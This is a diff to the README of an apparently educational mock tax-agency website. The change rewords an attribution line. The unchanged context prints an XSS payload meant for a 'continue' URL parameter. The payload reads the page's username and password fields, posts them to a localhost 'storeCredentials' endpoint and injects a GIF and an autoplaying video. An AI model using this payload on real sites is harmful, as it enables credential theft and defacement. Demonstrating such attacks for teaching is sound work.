@@ -24,7 +24,7 @@ To get started, navigate to No Man's Land Revenue Agency home page: [https://mts
 - This is the unencoded JavaScript code for the 'continue' parameter in the malicious URL:
 ```$.ajax({contentType:'application/json',type:'POST',url:'http://localhost:3000/storeCredentials',data:JSON.stringify({username:$('input:eq(0)').val(),password:$("input:eq(1)").val()})});$("article").first().append('<img src="https://media.tenor.com/7XnVtgeQv4EAAAAC/money-pool-rich.gif"/><iframe width="1" height="1" src="https://www.youtube.com/embed/_w7Ft_JTbH4?autoplay=1"></iframe>');console.log```
 - The website is based on Telephasic by HTML5UP!
-- Malicious code nspired by: [https://btvnovinite.bg/bulgaria/shegadzhii-udariha-sajta-na-nap.html](https://btvnovinite.bg/bulgaria/shegadzhii-udariha-sajta-na-nap.html)
+- Inspired by: [https://btvnovinite.bg/bulgaria/shegadzhii-udariha-sajta-na-nap.html](https://btvnovinite.bg/bulgaria/shegadzhii-udariha-sajta-na-nap.html)
 
 # License
 Creative Commons Attribution 3.0 Unported
